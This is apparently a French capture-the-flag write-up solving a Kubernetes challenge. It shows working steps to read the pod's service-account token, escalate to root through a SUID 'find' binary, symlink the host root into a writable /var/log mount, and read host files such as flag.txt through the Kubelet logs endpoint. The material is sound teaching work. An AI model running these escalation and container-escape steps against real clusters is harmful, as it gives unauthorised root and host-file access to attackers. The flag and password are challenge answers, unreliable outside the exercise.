# Introduction

```
Les nuages menaçants 3/3

Après avoir exploré tous les recoins du nuage, Proust s'exclame :
« Pouvez-vous en prendre le contrôle ? J'ai toujours voulu pouvoir diriger les nuages !

Connectez-vous au nuage avec le mot de passe suivant : 4GqWrNkNuN
Le challenge peut prendre quelques minutes à se lancer.
Le flag est dans /flag.txt sur l'hôte directement.
```

## Challenge

## Solution

Si on affiche l'environnement :

```sh
$ env
# ...
KUBERNETES_SERVICE_PORT_HTTPS=443                                                                        
KUBERNETES_SERVICE_PORT=443
HOSTNAME=start
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
PWD=/
NAMESPACE=default
HOME=/root
KUBERNETES_PORT_443_TCP=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PROTO=tcp
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
APISERVER=10.43.0.1:443
# ...
```

Initialiser son accès à l'API :

```sh
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""

# tester l'api : info cidr et services
kurl -v https://$APISERVER/api

# lister ses permissions depuis le pod
kurl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
    "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
#> permissions ...
```

On trouve pas plus qu'au challenge du niveau 2.

Se re-connecter au pod du challenge 2 en `ssh` :

```sh
ssh proust@10.42.0.13
> password: ********** # les_nuages
```

Conseil: utiliser `bash` dans le nouveau shell.

Observons nos droits sur ce pod, en reprenant certaines des infos plus haut (**attention, certaines var
d'env ne sont
pas présentes sur ce pod donc il vaut mieux reprendre certaines informations plus haut**) :

```sh
export APISERVER=10.43.0.1:443
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""

# lister ses permissions depuis le pod
kurl -i -s -k -X $'POST' \
    -H $'Content-Type: application/json' \
    --data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
    "https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```

Il semble que nous ne pouvons que lire les logs (`get`, `list` et `watch` sur `logs` et `nodes/log`).

**Là Il faut le savoir, mais en épluchant un peu Hacktricks, on apprend qu'il existe un exploit de
Kubernetes en utilisant le `/var/log` du pod** :

- https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/abusing-roles-clusterroles-in-kubernetes#hosts-writable-var-log-escape

En cherchant un peu, on trouve les points de montage :

```sh
$ lsblk
NAME    MAJ:MIN RM  SIZE RO TYPE MOUNTPOINTS
vda     252:0    0    3G  0 disk 
|-vda1  252:1    0  2.9G  0 part /var/host/log # <-- intéressant ...
|                                /etc/resolv.conf
|                                /etc/hostname
|                                /dev/termination-log
|                                /etc/hosts
|                                /flag.txt # <-- flag du niveau 2
 # detail more :
$ findmnt                                                                                                
TARGET SOURCE                                                     FSTYPE OPTIONS                         
/      overlay                                                    overla rw,rela                         
|-/flag.txt                                                                                              
|      /dev/vda1[/var/lib/kubelet/pods/636a17ec-7c6b-48f1-b45b-cbef3425098f/volumes/kubernetes.io~configmap/flag/..2023_05_24_22_13_59.3690815660/flag.txt]
|                                                                 ext4   ro,rela                            
|-/etc/hosts                                                                                             
|      /dev/vda1[/var/lib/kubelet/pods/636a17ec-7c6b-48f1-b45b-cbef3425098f/etc-hosts]                      
|                                                                 ext4   rw,rela                         
|-/etc/hostname                                                                                          
|      /dev/vda1[/var/lib/rancher/k3s/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/543c54e6c4c78f088817eebe80822a2ea1b8f9c9407b5ed87e4fd5416c4bb00d/hostname]
|                                                                 ext4   rw,rela                         
|-/etc/resolv.conf                                                                                       
|      /dev/vda1[/var/lib/rancher/k3s/agent/containerd/io.containerd.grpc.v1.cri/sandboxes/543c54e6c4c78f088817eebe80822a2ea1b8f9c9407b5ed87e4fd5416c4bb00d/resolv.conf]
|                                                                 ext4   rw,rela                         
|-/var/host/log                                                                                          
|      /dev/vda1[/var/log]                                        ext4   rw,rela                         
|-/run/secrets/kubernetes.io/serviceaccount                                                              
|      tmpfs                                                      tmpfs  ro,rela  
# ...
```

Il semble que les logs du host soit montés en `rw` sur le pod dans `/var/host/log`.
Il s'agit donc bien du vecteur d'attaque.
**En revanche, nous n'avons aucun droit d'écriture sur ces dossiers pour faire l'exploit selon la doc**.
Il va falloir faire une élévation de privilège. On peut s'aider du lien suivant :

- https://gtfobins.github.io/

Comme nous ne somme pas `sudoer`, vérifions s'il y a un binaire sur lequel le bit suid a été activé :

```sh
# SUID
$ find /usr/bin/ -perm /4000
/usr/bin/find
/usr/bin/newgrp
/usr/bin/su
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/umount
# SGID
$ find /usr/bin/ -perm /2000
/usr/bin/find
/usr/bin/expiry
/usr/bin/wall
/usr/bin/chage
/usr/bin/ssh-agent
# on peut aussi bidouiller sans find avec `qq'
# - 'ws
```

Il y en a même plusieurs x)
Justement, il y a `find` ... utilisons-le pour nous élever :

```sh
$ find . -exec /bin/bash -p \; -quit
$ id
uid=1000(proust) gid=1000(proust) euid=0(root) egid=0(root) groups=0(root),1000(proust)
```

Super !
Maintenant il nous faut revenir à l'exploit du `/var/host/log` et créer les fichiers dont nous avons
besoin :

```sh
ln -fs / /var/host/log/sym
```

Nous allons utiliser l'endpoint du Kubelet, récupéré au début du tuto, pour récupérer les logs.
L'endpoint du Kubelet écoute généralement sur `10.42.0.1:10250` (le `nmap` du niveau précédent nous le
montre bien) :

```sh
$ export KUBELET=10.42.0.1:10250
$ kurl -ksSL https://$KUBELET/logs/
<pre>
<a href="apt/">apt/</a>
<a href="auth.log">auth.log</a>
<a href="boot.log">boot.log</a>
<a href="btmp">btmp</a>
<a href="cloud-init-output.log">cloud-init-output.log</a>
<a href="cloud-init.log">cloud-init.log</a>
<a href="containers/">containers/</a>
<a href="dist-upgrade/">dist-upgrade/</a>
<a href="dpkg.log">dpkg.log</a>
<a href="journal/">journal/</a>
<a href="kern.log">kern.log</a>
<a href="landscape/">landscape/</a>
<a href="lastlog">lastlog</a>
<a href="lxd/">lxd/</a>
<a href="pods/">pods/</a>
<a href="syslog">syslog</a>
<a href="tallylog">tallylog</a>
<a href="ubuntu-advantage-timer.log">ubuntu-advantage-timer.log</a>
<a href="unattended-upgrades/">unattended-upgrades/</a>
<a href="wtmp">wtmp</a>
</pre>
```

On peut bien lister et lire les fichiers dans `/var/host/log` !
Essayons de lister le host en passant par le lien symbolique que nous venons de créer :

```sh
$ kurl -ksSL https://$KUBELET/logs/sym
<pre>
<a href="bin/">bin/</a>
<a href="boot/">boot/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="flag.txt">flag.txt</a>
<a href="home/">home/</a>
<a href="lib/">lib/</a>
<a href="lost+found/">lost+found/</a>
<a href="media/">media/</a>
<a href="mnt/">mnt/</a>
<a href="opt/">opt/</a>
<a href="proc/">proc/</a>
<a href="root/">root/</a>
<a href="run/">run/</a>
<a href="sbin/">sbin/</a>
<a href="snap/">snap/</a>
<a href="srv/">srv/</a>
<a href="sys/">sys/</a>
<a href="tmp/">tmp/</a>
<a href="usr/">usr/</a>
<a href="var/">var/</a>
</pre>
```

Coucou le flag !
Concluons :

```sh
$ kurl -ksSL https://$KUBELET/logs/sym/flag.txt
404CTF{les_journaux_sont_parfois_traitres}
```
